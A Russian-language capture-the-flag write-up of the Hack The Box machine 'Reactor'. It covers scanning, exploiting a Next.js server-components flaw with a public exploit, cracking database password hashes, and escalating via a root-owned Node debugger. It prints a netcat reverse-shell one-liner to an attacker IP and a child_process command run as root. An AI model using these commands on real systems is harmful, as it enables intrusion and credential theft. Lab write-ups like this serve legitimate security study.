# Сегодня я покажу как я проходил машину `Reactor` на платформе Hack The Box

Машина легкого уровня, в рамках 11 сезона. Когда я готовился к старту 11 сезона и за пару дней до начала, уже видя название машины, на 100% был уверен что будет что-то связанное с React и известной CVE `CVE-2025-55182` , она была очень известная пару месяцев назад.

---

# Разведка

Начинаю с полного сканирования портов, пользуюсь своим кастомным скриптом для сканирования:

```bash
#!/bin/bash
ports=$(nmap -p- --min-rate=500 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A $1
```

Запускаю скрипт:

```bash
┌──(jekawhitehat㉿kali)-[~/pen]
└─$ bash nmap.sh 10.129.245.214
```

Результат:

```text
Starting Nmap 7.99 ( https://nmap.org ) at XXXX-XX-XX 13:26 -0400
Nmap scan report for 10.129.245.214
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
```
Открыто 2 порта, на 3000 рабоает кастомное веб приложение, не отдает ничего полезного, в исходных файлах пусто, так же дирбастеринг не дал ничего полезного. Буду искать связь с реактом и проверять эту CVE
- `22/tcp` - SSH
- `3000/tcp` - веб приложение

Проверяю ссылки, которые засветились в выводе `nmap`.

---

# Поиск версий используемых сервисов

В ответе nmap присутствует следующий путь:

```text
/_next/static/chunks/webpack-db0a529a99835594.js
```

Открыв его, можно увидеть версию приложения - `Next.js 15.0.3`

Для этой версии существует очень известная и опасная уязвимость:

```text
CVE-2025-55182
```

Как я уже ранее говорил, по названию машины я уже сразу понял, что скорее всего всё будет связано именно с этим. `HTB` такое любит.

Буду использовать следующий эксплойт:

```text
https://github.com/iksanwkk/CVE-2025-55182-exp
```

---

# Эксплуатация

Скачиваю и запускаю эксплойт:

```bash
┌──(jekawhitehat㉿kali)-[~/pen/CVE-2025-55182-exp]
└─$ python3 exp.py http://10.129.245.214:3000 --revshell 10.10.1.1 4444
```

Результат:

```text
╔═══════════════════════════════════════════════════════════════╗
║  CVE-2025-55182 - React Server Components RCE Exploit      ║
║  Next.js Remote Code Execution Tool                         ║
╚═══════════════════════════════════════════════════════════════╝

[!] Attempting reverse shell to 10.10.1.1:4444
[!] Start listener: nc -lvnp 4444
[*] Target: http://10.129.245.214:3000
[*] Command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.1.1 4444 >/tmp/f
[*] Sending exploit payload...
[+] Command executed! Result in redirect: /login?a=rm: cannot remove '/tmp/f': No such file or directory;push
```

Перед запуском поднимаю слушатель:

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ nc -lvnp 4444
```

Получаю отскок ракушки:

```text
listening on [any] 4444 ...
connect to [10.10.1.1] from (UNKNOWN) [10.129.245.214] 46314
sh: 0: can't access tty; job control turned off

Стабилизирую оболочку:
python3 -c "import pty;pty.spawn('/bin/bash')"

node@reactor:/opt/reactor-app$ whoami
node
```

Захожу под пользователем `node` и сразу замечаю интересный файл:

```text
reactor.db
```

Похоже на локальную базу данных приложения, поэтому решаю посмотреть что там лежит.

---

# Анализ базы данных

Открываю базу:

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
```

Смотрю таблицы:

```sql
.tables
```

```text
sensor_logs
users
```

Проверяю структуру таблицы пользователей:

```sql
PRAGMA table_info(users);
```

Результат:

```text
0|id|INTEGER|0||1
1|username|TEXT|1||0
2|password_hash|TEXT|1||0
3|role|TEXT|1||0
4|email|TEXT|0||0

```
Запрашиваю все содержимое таблицы:
```sql
SELECT * FROM users;
```

Результат:

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Вижу хеш пользователя `engineer`.

Расшифровку делаю через `CrackStation`.

Получаю пароль:

```text
Login: engineer
Pass: reactor1
```

---

# Получение user.txt

Подключаюсь по SSH:

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ ssh engineer@10.129.245.214
```

Читаю пользовательский флаг:

```bash
engineer@reactor:~$ cat u*
```

Содержимое user.txt:

```text
84140878875ef6cfc5514f148999b514
```

---

# Повышение привилегий

Теперь время повышения привилегий.

Загружаю `linpeas.sh` и запускаю проверку. Пока идет перечисление, руками начинаю смотреть процессы.

После анализа результатов `linpeas` замечаю инетересный процесс `node` он запущен от имени `root` с включенным инспектором.

Проверяю процессы:

```bash
engineer@reactor:~$ ps aux | grep node
```

Результат:

```text
root 1393 0.0 1.1 1066624 45636 ? Ssl 17:24 0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Процесс запущен от `root`, а `node inspector` позволяет подключаться к работающему процессу и выполнять javascript внутри него.

Поскольку процесс принадлежит `root`, это выглядит как прямой путь к повышению привилегий.

---

# Эксплуатация Node Inspector и получение root флага

Подключаюсь:

```bash
engineer@reactor:~$ node inspect 127.0.0.1:9229
```

Результат:

```text
connecting to 127.0.0.1:9229 ... ok
```

Проверяю UID процесса:

```javascript
debug> exec("process.getuid()")
```

Результат:

```text
0
```

`0` соответствует пользователю `root`.

Теперь могу выполнять системные команды через JavaScript внутри процесса.

Читаю root флаг напрямую:

```javascript
debug> exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

Результат:

```text
'1a9c10d5c5c0105ecf0be7c506daeafd\n'
```

---


